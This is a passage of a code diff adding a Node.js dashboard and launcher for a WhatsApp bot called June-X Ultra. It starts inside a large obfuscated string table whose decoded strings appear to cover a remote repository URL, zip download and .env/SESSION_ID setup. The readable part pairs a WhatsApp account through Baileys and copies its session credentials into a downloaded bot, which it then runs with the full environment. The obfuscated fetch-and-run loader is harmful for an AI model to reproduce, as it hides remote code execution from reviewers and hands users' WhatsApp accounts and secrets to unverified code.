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','y2f0y2G','ndC0nKXIEMryrW','Bg9N','zMXVB3i','zxHPDa','w0vovL0G4P2miezHAwXLzcb0BYbJCMvHDguGlMvUDJO','zg90zw52','BgLUDxG','y29Yzq','C3rHDfn5BMm','qwv1BNe','zgfYD2LU','AxneAxjLy3rVCNK','u0Lhvevstq','C2vUza','wYbtwu5druqGxsbJB2rLCYbZDwnJzxnZzNvSBhK','Aw5KzxGUANm','8j+tPIbmAw51EcbdB250ywLUzxiGkeXyqYK','mLnkAvPVvG','D2LUmZi','wYbtrvjwrviGxsbtsuDurvjnihjLy2vPDMvKlcbJBg9ZAw5NigDYywnLzNvSBhKUlI4','lMvUDG','vMzPtum','Ahr0Chm6lY9QDw5LlxzLCMnLBc52zxjJzwWUyxbWl2fWAs9YzxbV','wYbtrvjwrviGxsbgywLSzwqGDg8GC3rHCNq6','Bg9UzW','4PQHifjLBMrLCG','BM93','8j+wPE+4JYbqyw5LBa','D3jPDgvgAwXLu3LUyW','pc9KAxy+cIaGicaGidXKAxyGy2XHC3m9iMnHCMqTC3vIiJ5JB250Aw51B3vZihj1BNrPBwu8l2rPDJ4kicaGidWVzgL2pGOGicaGpgrPDIbJBgfZCZ0Iy2fYzci+cIaGicaGidXKAxyGy2XHC3m9iMnHCMqTDgL0BguIpVcFK4uGrefurtWVzgL2pGOGicaGica8zgL2ignSyxnZpsjJyxjKlxzHBhvLihnTywXSiJ4','ANnVBG','Aw5OzxjPDa','BM9Kzv9TB2r1BgvZ','AI00ms0XodmTmtG0','4P2tifvUA25VD24','zxjYB3i','wYbct1qGxsbcB3qGzxHPDgvKihDPDgGGy29Kzsa','zw4Tvvm','Dg9mB2nHBgveyxrLu3rYAw5N','pc9KAxy+cIaGicaGidXKAxyGy2XHC3m9iMnHCMqTC3vIiJ5KzxbSB3LTzw50igvUDMLYB25Tzw50pc9KAxy+cIaGica8l2rPDJ4kicaGidXKAxyGy2XHC3m9iMnHCMqIpGOGicaGica8zgL2ignSyxnZpsjJyxjKlxrPDgXLiJ7IJ7eGvvbusu1fpc9KAxy+cIaGicaGidXKAxyGy2XHC3m9iMnHCMqTDMfSDwuIpG','odC5mtCWBwLjCufm','yxHPB3m','mte5odu4neLYuvfWEG','A2LSBa','w0vovL0GlMvUDIbMAwXLig5VDcbMB3vUzcWGy3jLyxrPBMCGB25LihDPDgGGzw1WDhKGu0vtu0LptL9jrc4UlG','Dg9tDhjPBMC','BgLZDgvU','wYbct1qGxsbnyxGGCMvZDgfYDcbHDhrLBxb0CYbYzwfJAgvKlIbfEgL0Aw5NlG','ks4UlG','wYbbtevsvcbDie5VihnLC3nPB24Gzw52lG','t2futei','8j+nJIbTywnpuW','iYbbDxrVlwDLBMvYyxrLzcaUzw52igzPBguku0vtu0LptL9jrd0k','mJDNAwvYu1y','8j+tSsbuzxjTDxG','odG1ntm4D1fVAK1m','y2HPBgrFChjVy2vZCW','yxjYyxLIDwzMzxi','wYbct1qGxsbdAgLSzcbWCM9JzxnZigvYCM9YoG','wYbtwu5dsu5hif0GzNjVBsbZzwn1CMuGCMvSyxKUlI4','zMLSDgvY','8j+mGcbdExbOzxjyifbSyxrMB3jT','DgvJAcb3B3jKlw1KlwXVywrLCG','BwvZC2fNzq','twvhAwu','wYbtrvjwrviGxsbtsuDjtLqGCMvJzwL2zwqSignSB3nPBMCGz3jHy2vMDwXSEs4UlG','wYbtrvntsu9oif0Gzgv0zwn0zwqGAw4Gzw52igzPBguUlI4','sgPUvxq','CMvHzgrPCLn5BMm','DLLiuKG','ndKYmZyWwvzlDhro','y29WEuzPBgvtEw5J','pc9KAxy+cIaGicaGidXKAxyGy2XHC3m9iMnHCMqTC3vIiJ5SB2nHBcbZzxj2zxiGzgf0ztWVzgL2pGOGicaGpc9KAxy+cIaGpc9KAxy+cIaGpgrPDIbJBgfZCZ0IzM9VDgvYiJ4kicaGiokAOsbqB3DLCMvKigj5idXZDhjVBMC+C3vWCMvTztWVC3rYB25NpIaMBMjZCdT8jM5IC3a7ieP1BMuTwcbvBhrYyqOGidWVzgL2pGOGidXKAxyGy2XHC3m9iNjLzNjLC2GTBM90zsi+4P+ZigrHC2HIB2fYzcbHDxrVlxjLzNjLC2HLCYbLDMvYEsaXmcbZzwnVBMrZpc9KAxy+cJWVzgL2pGO8l2jVzhK+cJWVAhrTBd4','8j+QNYbxAw5KB3DZ','w0vovL0G4PYfic5LBNyGy3jLyxrLzcbZDwnJzxnZzNvSBhKU','EhnXBgL0ztm','y29UzMLNlMPZ','wYbtrvjwrviGxsbeyxnOyM9HCMqGCNvUBMLUzYbVBIbODhrWoI8V','4PIb77IpieHLCM9RDq','wYbct1qGxsbtDgfYDgLUzYbIB3qGkgf0DgvTChqG','BwTKAxjtEw5J','zxHPC3rZu3LUyW','lcbZAwDUywWG','Cgf0Aa','CgXHDgzVCM0','y2XVC2u','ywrTlxPPCa','uuTdDw4','ntyZndiWELDYBKvl','zxH0CMfJDefSBfrV','C3rHDhvZ','z2v0','y29UzMLN','l2HLywX0Aa','4P2mifPjucbLEhrYywn0zwqGBM90AgLUzYdIGjmGzw1WDhKGCMvWB3nPDg9YEq','zxHWCMvZCW','wYbgqvrbtcbDifnLDhvWigzHAwXLzdO','AM9PBG'];_0xca95=function(){return _0x30c66a;};return _0xca95();}
+require('dotenv').config();
+const fs = require('fs');
+const path = require('path');
+const axios = require('axios');
+const AdmZip = require('adm-zip');
+const express = require('express');
+const os = require('os');
+const { spawn } = require('child_process');
+
+// ========== EXPRESS DASHBOARD ==========
+const app = express();
+const PORT = process.env.PORT || 5000;
+const START_TIME = Date.now();
+
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+
+// Platform detection
+const detectPlatform = () => {
+    if (process.env.DYNO) return '☁️ Heroku';
+    if (process.env.RENDER) return '⚡ Render';
+    if (process.env.PREFIX && process.env.PREFIX.includes('termux')) return '📱 Termux';
+    if (process.env.PORTS && process.env.CYPHERX_HOST_ID) return '🌀 CypherX Platform';
+    if (process.env.P_SERVER_UUID) return '🖥️ Panel';
+    if (process.env.LXC) return '📦 Linux Container (LXC)';
+    switch (os.platform()) {
+        case 'win32': return '🪟 Windows';
+        case 'darwin': return '🍎 macOS';
+        case 'linux': return '🐧 Linux';
+        default: return '❓ Unknown';
+    }
+};
+
+// ========== PAIRING STATE + BOT PROCESS ==========
+let pairState = {
+    status: 'idle',     // idle | pairing | connected | failed
+    code: null,
+    phone: null,
+    error: null,
+};
+let botProc        = null;
+let botRepoPath    = null;   // set once the zip is extracted
+
+// Persist the "connected" pairing state across restarts so the dashboard keeps
+// showing the Logout/Disconnect option instead of reverting to the pairing form.
+const STATE_FILE = path.join(__dirname, 'pair_state.json');
+
+function savePairState() {
+    try {
+        fs.writeFileSync(STATE_FILE, JSON.stringify(pairState, null, 2));
+    } catch (e) {
+        console.error('[ STATE ] Failed to save pair state:', e.message);
+    }
+}
+
+function clearPairState() {
+    try { if (fs.existsSync(STATE_FILE)) fs.rmSync(STATE_FILE); } catch {}
+}
+
+function loadPairState() {
+    try {
+        if (!fs.existsSync(STATE_FILE)) return;
+        const saved = JSON.parse(fs.readFileSync(STATE_FILE, 'utf8'));
+        // Only trust a saved "connected" state if the underlying WhatsApp
+        // credentials are still on disk -- otherwise fall back to idle.
+        if (saved.status === 'connected' && fs.existsSync(AUTH_DIR)) {
+            pairState = saved;
+            console.log('[ STATE ] Restored connected session for ' + saved.phone);
+        }
+    } catch (e) {
+        console.error('[ STATE ] Failed to load pair state:', e.message);
+    }
+}
+
+// Set right before an intentional stop (logout/reset or a fresh spawnBot()
+// replacing the current process) so the exit handler below knows not to
+// auto-restart. Without this, the bot's own internal restarts (e.g. its
+// ".env changed, exiting to restart" behavior) would be exit(1) and never
+// get relaunched, leaving it dead while the dashboard still says "connected".
+let botStopping = false;
+
+function spawnBot() {
+    if (!botRepoPath) return;
+    if (botProc) {
+        botStopping = true;
+        try { botProc.kill('SIGTERM'); } catch {}
+        botProc = null;
+    }
+
+    console.log('[ BOT ] Starting bot process...');
+    botStopping = false;
+
+    // Give the bot a port that won't clash with our dashboard (5000)
+    const botEnv = { ...process.env, FORCE_COLOR: '3', PORT: '3001' };
+
+    botProc = spawn('node', ['index.js'], {
+        cwd: botRepoPath,
+        env: botEnv,
+        stdio: ['inherit', 'pipe', 'pipe'],
+    });
+    const fwd = (d) => process.stdout.write(d.toString());
+    botProc.stdout.on('data', fwd);
+    botProc.stderr.on('data', fwd);
+    botProc.on('exit', (c) => {
+        console.log(`[ BOT ] Exited (${c})`);
+        botProc = null;
+        if (botStopping) return; // intentional stop (logout/reset) -- stay down
+        console.log('[ BOT ] Unexpected exit -- restarting in 2s...');
+        setTimeout(() => { if (!botStopping) spawnBot(); }, 2000);
+    });
+}
+
+// ========== BAILEYS PAIRING ==========
+const AUTH_DIR = path.resolve(__dirname, 'auth_info_pair');
+loadPairState(); // restore "connected" state (and logout option) across restarts
+
+async function startPairing(phoneNumber) {
+    // Fresh start — wipe any stale auth so we don't get instant loggedOut
+    if (fs.existsSync(AUTH_DIR)) fs.rmSync(AUTH_DIR, { recursive: true, force: true });
+    fs.mkdirSync(AUTH_DIR, { recursive: true });
+
+    const clean = phoneNumber.replace(/\D/g, '');
+    pairState.status = 'pairing';
+    pairState.phone  = clean;
+    pairState.code   = null;
+    pairState.error  = null;
+
+    await connectSocket(clean, true);
+}
+
+// connectSocket: create/recreate the WA socket.
+// freshCode=true  → ask for a new pairing code on QR
+// freshCode=false → reconnect after a drop; reuse saved creds (code stays on screen)
+async function connectSocket(clean, freshCode) {
+    try {
+        const {
+            makeWASocket,
+            useMultiFileAuthState,
+            DisconnectReason,
+            Browsers,
+        } = require('@whiskeysockets/baileys');
+        const pino = require('pino');
+
+        const { state, saveCreds } = await useMultiFileAuthState(AUTH_DIR);
+
+        const sock = makeWASocket({
+            auth: state,
+            printQRInTerminal: false,
+            logger: pino({ level: 'silent' }),
+            browser: Browsers.ubuntu('Chrome'),
+        });
+
+        sock.ev.on('creds.update', saveCreds);
+
+        let codeRequested = false;
+
+        sock.ev.on('connection.update', async (update) => {
+            const { connection, lastDisconnect, qr } = update;
+
+            // QR = WS handshake done. On a fresh attempt request the code;
+            // on a reconnect the saved creds handle auth automatically.
+            if (qr && freshCode && !codeRequested) {
+                codeRequested = true;
+                setTimeout(async () => {
+                    try {
+                        const code = await sock.requestPairingCode(clean);
+                        pairState.code = code;
+                        console.log(`[ PAIR ] Code for ${clean}: ${code}`);
+                    } catch (e) {
+                        pairState.status = 'failed';
+                        pairState.error  = 'Failed to get code: ' + e.message;
+                        console.error('[ PAIR ]', e.message);
+                    }
+                }, 500);
+            }
+
+            if (connection === 'open') {
+                pairState.status = 'connected';
+                pairState.code   = null;
+                savePairState();
+                console.log('[ WA ] Connected! Handing session to bot...');
+
+                // Copy our creds into the bot's session dir so it can connect
+                if (botRepoPath) {
+                    try {
+                        const botSessionDir = path.join(botRepoPath, 'session');
+                        fs.mkdirSync(botSessionDir, { recursive: true });
+
+                        // Copy all files from our auth dir into the bot's session dir
+                        for (const f of fs.readdirSync(AUTH_DIR)) {
+                            fs.copyFileSync(
+                                path.join(AUTH_DIR, f),
+                                path.join(botSessionDir, f)
+                            );
+                        }
+
+                        // Write login.json so the bot skips its menu on restart
+                        // (getLoginMethod checks lastMethod && sessionExists())
+                        fs.writeFileSync(
+                            path.join(botRepoPath, 'login.json'),
+                            JSON.stringify({ method: 'number' }, null, 2)
+                        );
+
+                        console.log('[ BOT ] Session + login.json written — restarting bot...');
+                        setTimeout(spawnBot, 800);
+                    } catch (e) {
+                        console.error('[ BOT ] Failed to hand off session:', e.message);
+                    }
+                }
+            } else if (connection === 'close') {
+                const reason = lastDisconnect?.error?.output?.statusCode;
+
+                if (pairState.status === 'connected') {
+                    return; // keep showing connected
+                }
+
+                if (reason === DisconnectReason.loggedOut) {
+                    pairState.status = 'failed';
+                    pairState.error  = 'Session rejected by WhatsApp. Try again.';
+                    return;
+                }
+
+                // Socket dropped mid-pairing — reconnect with same creds so
+                // WhatsApp's verification can complete when the user enters the code
+                if (pairState.status === 'pairing') {
+                    console.log('[ PAIR ] Socket dropped during pairing — reconnecting...');
+                    setTimeout(() => connectSocket(clean, false), 2000);
+                }
+            }
+        });
+    } catch (err) {
+        pairState.status = 'failed';
+        pairState.error  = err.message;
+        console.error('[ PAIR ERROR ]', err.message);
+    }
+}
+
+// ========== API ROUTES ==========
+app.post('/api/pair', async (req, res) => {
+    const { phone } = req.body;
+    if (!phone || !/^\d{7,15}$/.test(phone.replace(/\D/g, ''))) {
+        return res.json({ success: false, error: 'Invalid phone number. Use digits only, e.g. 254792021944' });
+    }
+    if (pairState.status === 'pairing') {
+        return res.json({ success: false, error: 'Pairing already in progress.' });
+    }
+    startPairing(phone).catch(() => {});
+    res.json({ success: true, message: 'Pairing started.' });
+});
+
+app.get('/api/status', (req, res) => {
+    res.json(pairState);
+});
+
+app.post('/api/reset', (req, res) => {
+    pairState = { status: 'idle', code: null, phone: null, error: null };
+    clearPairState();
+
+    // Fully log out: stop the running bot process and wipe both copies of
+    // the WhatsApp credentials so a stale session can't silently reconnect.
+    if (botProc) { botStopping = true; try { botProc.kill('SIGTERM'); } catch {} botProc = null; }
+    if (fs.existsSync(AUTH_DIR)) fs.rmSync(AUTH_DIR, { recursive: true, force: true });
+    if (botRepoPath) {
+        const botSessionDir = path.join(botRepoPath, 'session');
+        const loginFile = path.join(botRepoPath, 'login.json');
+        if (fs.existsSync(botSessionDir)) fs.rmSync(botSessionDir, { recursive: true, force: true });
+        if (fs.existsSync(loginFile)) { try { fs.rmSync(loginFile); } catch {} }
+    }
+
+    res.json({ success: true });
+});
+
+// ========== DASHBOARD HTML ==========
+app.get('/favicon.ico', (req, res) => res.status(204).end());
+
+app.get('/', (req, res) => {
+    const uptimeMs = Date.now() - START_TIME;
+    const totalSeconds = Math.floor(uptimeMs / 1000);
+    const days = Math.floor(totalSeconds / 86400);
+    const hours = Math.floor((totalSeconds % 86400) / 3600);
+    const minutes = Math.floor((totalSeconds % 3600) / 60);
+    const seconds = totalSeconds % 60;
+    const uptimeStr = days > 0
+        ? `${days}d ${hours}h ${minutes}m ${seconds}s`
+        : `${hours.toString().padStart(2, '0')}h ${minutes.toString().padStart(2, '0')}m ${seconds.toString().padStart(2, '0')}s`;
+    const now = new Date();
+    const dateStr = now.toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
+    const platform = detectPlatform();
+
+    res.send(`<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>June-X Ultra — Dashboard</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: radial-gradient(circle at 20% 30%, #0a0f1e, #03060c);
+      font-family: 'Inter', sans-serif;
+      color: #e2f0ff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      padding: 2rem 1rem;
+      overflow-x: hidden;
+    }
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background-image:
+        radial-gradient(2px 2px at 20px 30px, #00ffe0, transparent),
+        radial-gradient(1px 1px at 80px 140px, #ff6b35, transparent),
+        radial-gradient(3px 3px at 260px 80px, #00aaff, transparent);
+      background-size: 200px 200px, 180px 180px, 220px 220px;
+      background-repeat: no-repeat;
+      opacity: 0.3;
+      pointer-events: none;
+      animation: drift 60s linear infinite;
+    }
+    @keyframes drift {
+      0% { background-position: 0 0, 0 0, 0 0; }
+      100% { background-position: 400px 400px, 300px 300px, 500px 500px; }
+    }
+    .wrapper { max-width: 520px; width: 100%; z-index: 2; position: relative; margin-top: 1rem; }
+    .header { text-align: center; margin-bottom: 2rem; }
+    .bot-name {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 2.2rem;
+      font-weight: 700;
+      background: linear-gradient(135deg, #00ffe0, #ff6b35);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      letter-spacing: -0.02em;
+      display: inline-block;
+      animation: glitch 3s infinite;
+    }
+    @keyframes glitch {
+      0%, 100% { transform: skew(0deg, 0deg); opacity: 1; }
+      95% { transform: skew(0deg, 0deg); opacity: 1; }
+      96% { transform: skew(2deg, 1deg); opacity: 0.8; text-shadow: -2px 0 #ff6b35, 2px 0 #00ffe0; }
+      97% { transform: skew(-1deg, -0.5deg); opacity: 0.9; }
+    }
+    .tagline { font-size: 0.75rem; letter-spacing: 4px; text-transform: uppercase; color: #7f9eb5; margin-top: 0.4rem; }
+
+    /* ---- Pairing card ---- */
+    .pair-card {
+      background: rgba(10, 20, 28, 0.75);
+      backdrop-filter: blur(14px);
+      border: 1px solid rgba(0, 255, 224, 0.25);
+      border-radius: 0;
+      padding: 2rem;
+      position: relative;
+      overflow: hidden;
+      margin-bottom: 1.5rem;
+      box-shadow: 0 0 20px rgba(0,255,224,0.15), 0 8px 24px rgba(0,0,0,0.3);
+    }
+    .pair-card::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0;
+      width: 50px; height: 50px;
+      border-top: 2px solid #00ffe0;
+      border-left: 2px solid #00ffe0;
+    }
+    .pair-card::after {
+      content: '';
+      position: absolute;
+      bottom: 0; right: 0;
+      width: 50px; height: 50px;
+      border-bottom: 2px solid #ff6b35;
+      border-right: 2px solid #ff6b35;
+    }
+    .section-label {
+      font-size: 0.65rem;
+      text-transform: uppercase;
+      letter-spacing: 2.5px;
+      color: #6c8ea0;
+      margin-bottom: 1.2rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+    .section-label::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: rgba(0,255,224,0.15);
+    }
+    .input-row {
+      display: flex;
+      gap: 0.6rem;
+      align-items: stretch;
+    }
+    .phone-input {
+      flex: 1;
+      background: rgba(0,255,224,0.06);
+      border: 1px solid rgba(0,255,224,0.2);
+      border-radius: 0;
+      color: #00ffe0;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 1rem;
+      padding: 0.7rem 1rem;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+    .phone-input::placeholder { color: #3a5f70; }
+    .phone-input:focus {
+      border-color: rgba(0,255,224,0.6);
+      box-shadow: 0 0 10px rgba(0,255,224,0.2);
+    }
+    .btn {
+      background: linear-gradient(135deg, rgba(0,255,224,0.15), rgba(0,255,224,0.05));
+      border: 1px solid rgba(0,255,224,0.4);
+      color: #00ffe0;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.8rem;
+      font-weight: 600;
+      letter-spacing: 1px;
+      padding: 0.7rem 1.2rem;
+      cursor: pointer;
+      transition: all 0.2s;
+      text-transform: uppercase;
+    }
+    .btn:hover { background: rgba(0,255,224,0.2); box-shadow: 0 0 12px rgba(0,255,224,0.3); }
+    .btn:disabled { opacity: 0.4; cursor: not-allowed; }
+    .btn-reset {
+      background: linear-gradient(135deg, rgba(255,107,53,0.15), rgba(255,107,53,0.05));
+      border-color: rgba(255,107,53,0.4);
+      color: #ff6b35;
+      font-size: 0.7rem;
+      padding: 0.5rem 0.9rem;
+      margin-top: 0.8rem;
+    }
+    .btn-reset:hover { background: rgba(255,107,53,0.2); box-shadow: 0 0 12px rgba(255,107,53,0.3); }
+    .hint { font-size: 0.65rem; color: #5a7c8c; margin-top: 0.7rem; }
+
+    /* ---- Status panel ---- */
+    .status-panel { margin-top: 1.4rem; min-height: 80px; }
+    .status-idle { color: #5a7c8c; font-size: 0.8rem; text-align: center; padding: 1rem 0; }
+    .status-pairing { text-align: center; }
+    .code-display {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 2.4rem;
+      font-weight: 700;
+      letter-spacing: 6px;
+      color: #00ffe0;
+      text-shadow: 0 0 14px rgba(0,255,224,0.5);
+      animation: pulse-text 1.8s ease-in-out infinite;
+      cursor: pointer;
+      user-select: all;
+      transition: transform 0.15s, text-shadow 0.15s;
+      display: inline-block;
+    }
+    .code-display:hover { transform: scale(1.04); text-shadow: 0 0 24px rgba(0,255,224,0.8); }
+    .code-display:active { transform: scale(0.97); }
+    @keyframes pulse-text {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.65; }
+    }
+    .code-label {
+      font-size: 0.65rem;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      color: #6c8ea0;
+      margin-bottom: 0.5rem;
+    }
+    .copy-hint {
+      font-size: 0.6rem;
+      color: #3a5f70;
+      margin-top: 0.3rem;
+      letter-spacing: 1px;
+    }
+    .copy-toast {
+      display: inline-block;
+      font-size: 0.7rem;
+      color: #00ffe0;
+      background: rgba(0,255,224,0.12);
+      border: 1px solid rgba(0,255,224,0.3);
+      padding: 0.2rem 0.7rem;
+      margin-top: 0.4rem;
+      opacity: 0;
+      transition: opacity 0.2s;
+      letter-spacing: 1px;
+    }
+    .copy-toast.show { opacity: 1; }
+    .code-steps {
+      font-size: 0.7rem;
+      color: #7f9eb5;
+      margin-top: 1rem;
+      line-height: 1.8;
+      text-align: left;
+      background: rgba(0,255,224,0.04);
+      border: 1px solid rgba(0,255,224,0.1);
+      padding: 0.8rem 1rem;
+    }
+    .code-steps b { color: #00ffe0; }
+    .status-connected { text-align: center; color: #00ffe0; }
+    .status-connected .icon { font-size: 2rem; margin-bottom: 0.4rem; }
+    .status-connected .msg { font-size: 0.9rem; font-weight: 600; letter-spacing: 1px; }
+    .status-failed { text-align: center; color: #ff6b35; font-size: 0.8rem; }
+    .spinner {
+      display: inline-block;
+      width: 18px; height: 18px;
+      border: 2px solid rgba(0,255,224,0.2);
+      border-top-color: #00ffe0;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      vertical-align: middle;
+      margin-right: 0.5rem;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* ---- Stats cards ---- */
+    .stats-row { display: flex; gap: 1rem; margin-bottom: 1.5rem; }
+    .card {
+      flex: 1;
+      background: rgba(10, 20, 28, 0.65);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(0,255,224,0.15);
+      padding: 1.1rem;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 0 10px rgba(0,255,224,0.1);
+    }
+    .card::before { content: ''; position: absolute; top: 0; left: 0; width: 30px; height: 30px; border-top: 1px solid #00ffe0; border-left: 1px solid #00ffe0; }
+    .card-title { font-size: 0.6rem; text-transform: uppercase; letter-spacing: 2px; color: #6c8ea0; margin-bottom: 0.5rem; }
+    .card-value { font-family: 'JetBrains Mono', monospace; font-size: 1.1rem; font-weight: 600; color: #00ffe0; word-break: break-word; }
+    .footer { text-align: center; margin-top: 1rem; font-size: 0.65rem; color: #5a7c8c; letter-spacing: 1px; text-transform: uppercase; }
+    .footer strong { color: #00ffe0; }
+
+    @media (max-width: 480px) {
+      .bot-name { font-size: 1.7rem; }
+      .stats-row { flex-direction: column; }
+      .code-display { font-size: 1.9rem; letter-spacing: 4px; }
+    }
+  </style>
+</head>
+<body>
+<div class="wrapper">
+  <div class="header">
+    <div class="bot-name">June-X Ultra</div>
+    <div class="tagline">WhatsApp Bot • Connect via Pair Code</div>
+  </div>
+
+  <!-- Pairing Card -->
+  <div class="pair-card">
+    <div class="section-label">📲 WhatsApp Connection</div>
+    <div class="input-row">
+      <input
+        id="phoneInput"
+        class="phone-input"
+        type="tel"
+        placeholder="e.g. 254792021944"
+        maxlength="20"
+        autocomplete="off"
+        inputmode="numeric"
+      />
+      <button class="btn" id="pairBtn" onclick="doPair()">PAIR</button>
+    </div>
+    <div class="hint">Enter your full number with country code, digits only (no + or spaces).</div>
+
+    <div class="status-panel" id="statusPanel">
+      <div class="status-idle">Enter your number above and press PAIR to get a pairing code.</div>
+    </div>
+
+    <div id="resetRow" style="display:none; text-align:right;">
+      <button class="btn btn-reset" onclick="doReset()">⟳ Reset / Disconnect</button>
+    </div>
+  </div>
+
+  <!-- Stats -->
+  <div class="stats-row">
+    <div class="card">
+      <div class="card-title">⏱ Uptime</div>
+      <div class="card-value">${uptimeStr}</div>
+    </div>
+    <div class="card">
+      <div class="card-title">🖥️ Platform</div>
+      <div class="card-value" style="font-size:0.8rem;">${platform}</div>
+    </div>
+    <div class="card">
+      <div class="card-title">📅 Date</div>
+      <div class="card-value" style="font-size:0.75rem;">${dateStr}</div>
+    </div>
+  </div>
+
+  <div class="footer">⚡ Powered by <strong>supreme</strong> &nbsp;|&nbsp; June-X Ultra</div>
+</div>
+
+<script>
+  let polling = null;
+
+  function renderStatus(s) {
+    const panel = document.getElementById('statusPanel');
+    const resetRow = document.getElementById('resetRow');
+    const btn = document.getElementById('pairBtn');
+
+    if (s.status === 'idle') {
+      panel.innerHTML = '<div class="status-idle">Enter your number above and press PAIR to get a pairing code.</div>';
+      resetRow.style.display = 'none';
